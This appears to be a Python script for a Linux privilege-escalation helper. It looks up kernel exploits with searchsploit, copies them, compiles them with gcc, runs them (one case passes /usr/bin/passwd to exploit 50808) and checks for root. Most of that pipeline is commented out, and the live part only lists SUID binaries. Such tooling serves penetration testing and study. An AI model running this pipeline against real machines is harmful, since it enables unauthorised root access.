import subprocess
import re
import os
import suid
import utils

"""
***************************************************************************************
TODO:
Decied if we want to do a real check by exploit the vul and report it to the user
Check how to intergrate GTFOBins
add Vector attacks:
    SUDO
    SUID (Set User ID):
    Capabilities:
    Cron Jobs:
    PATH:
    NFS (Network File System)


"""
def get_kernel_version():
    """
    Gets the Linux kernel version, returning only the major and minor version numbers.
    """
    command = "cat /proc/version"
    output = utils.execute_command(command)
    match = re.search(r'(\d+\.\d+)', output)
    if match:
        return match.group(1)
    else:
        return "Version not found"


def search_exploits(kernel_version):
    """
    Searches for exploits using searchsploit based on the kernel version.
    """
    command = f"searchsploit linux kernel {kernel_version} --www"
    output = utils.execute_command(command)
    return output


def extract_exploit_ids(exploits_output):
    """
    Extracts exploit IDs from the searchsploit output.
    """
    exploit_ids = re.findall(r'/exploits/(\d+)', exploits_output)
    return exploit_ids


def ensure_directory(directory):
    """
    Ensures that a directory exists; creates it if it doesn't.
    """
    if not os.path.exists(directory):
        os.makedirs(directory)


def get_subfolder_name(list_of_vector):
    """
    Returns the subfolder name based on the list_of_vector.
    """
    # Define mappings for list_of_vector to subfolder names
    vector_to_subfolder = {
        "kernel_exploits": "kernel_exploits",
        "SUID": "SUID_exploits",
        # Add more mappings as needed
    }

    # Default subfolder name if not found in the mappings
    default_subfolder = "other_exploits"

    # Return the subfolder name based on list_of_vector
    return vector_to_subfolder.get(list_of_vector, default_subfolder)


def copy_exploit(exploit_id, list_of_vector, directory="exploits"):
    """
    Copies an exploit to the specified directory and subfolder based on list_of_vector using searchsploit's -m option.
    """
    # Save the original directory
    original_directory = os.getcwd()

    # Ensure the main directory exists
    ensure_directory(directory)

    # Determine the subfolder based on list_of_vector
    subfolder = os.path.join(directory, get_subfolder_name(list_of_vector))
    ensure_directory(subfolder)

    # Change the current working directory to the subfolder
    os.chdir(subfolder)

    # Check if the exploit file already exists, and if so, delete it
    exploit_file = f"{exploit_id}.c"
    if os.path.exists(exploit_file):
        os.remove(exploit_file)

    # Copy the exploit
    command = f"searchsploit -m {exploit_id}"
    result = utils.execute_command(command)

    # Change back to the original directory if needed
    os.chdir(original_directory)

    print(result)
def compile_exploit(exploit_file):
    """
    Compiles an exploit file if it's a C file.
    """
    if not exploit_file.endswith('.c'):
        print("The exploit file does not appear to be a C file. Skipping compilation.")
        return None
    # Assuming the exploit file is a C file, compile it
    compiled_name = exploit_file.replace('.c', '')
    compile_command = f"gcc {exploit_file} -o {compiled_name} -pthread"
    try:
        utils.execute_command(compile_command)
        print(f"Compiled {exploit_file} successfully.")
        return compiled_name
    except Exception as e:
        print(f"Failed to compile {exploit_file}: {e}")
        return None

def run_exploit(exploit_executable, vector, exploit_id):
    """
    Executes the compiled exploit or a script.
    """
    if not exploit_executable:
        print("No executable provided to run.")
        return

    run_command = f"./{exploit_executable}"

    match vector:
        case 'Kernel':
            if exploit_id == '50808':
                run_command += " /usr/bin/passwd"
                print(f"Exploiting Kernel vulnerability with ID {exploit_id} using /usr/bin/passwd as an additional parameter.")
        case 'SUID':
            # Handle SUID vector if needed
            pass
        case _:
            print(f"Vector {vector} is not supported. Skipping exploit execution.")

    try:
        print(f"Running exploit: {exploit_executable}")
        output = utils.execute_command(run_command)
        print(output)
    except Exception as e:
        print(f"Failed to run exploit {exploit_executable}: {e}")

def am_i_root():
    if os.geteuid() == 0:
        print("I am root now!")
    else:
        print("Still not root.")
def main():
    # list_of_vector = "kernel_exploits"
    # kernel_version = get_kernel_version()
    # print(f"Kernel Version (major.minor): {kernel_version}")
    #
    # print("\nSearching for exploits for the kernel version...")
    # exploits_output = search_exploits(kernel_version)
    #
    # exploit_ids = extract_exploit_ids(exploits_output)
    # if exploit_ids:
    #     print("Found potential exploit! IDs:", exploit_ids)
    #     # Copy all found exploits
    #     for exploit_id in exploit_ids:
    #         copy_exploit(exploit_id, list_of_vector)
    # else:
    #     print("No exploits found for the kernel version.")

    # Check for SUID binaries using the suid_check module
    print("\nChecking for SUID binaries on the system:")
    suid_binaries = suid.check_suid_binaries()
    if isinstance(suid_binaries, list):
        print("SUID binaries found:")
        for binary in suid_binaries:
            print(binary)
    else:
        print(f"Error: {suid_binaries}")

    # exploit_file = 'kernel_exploits/50808.c'  # Placeholder for the actual exploit file name
    # if os.path.exists(exploit_file):
    #     compiled_exploit = compile_exploit(exploit_file)
    #     run_exploit(compiled_exploit or exploit_file, 'Kernel', '50808')
    #     am_i_root()
    # else:
    #     print(f"Exploit file {exploit_file} not found. Please download it manually.")




if __name__ == "__main__":
    main()
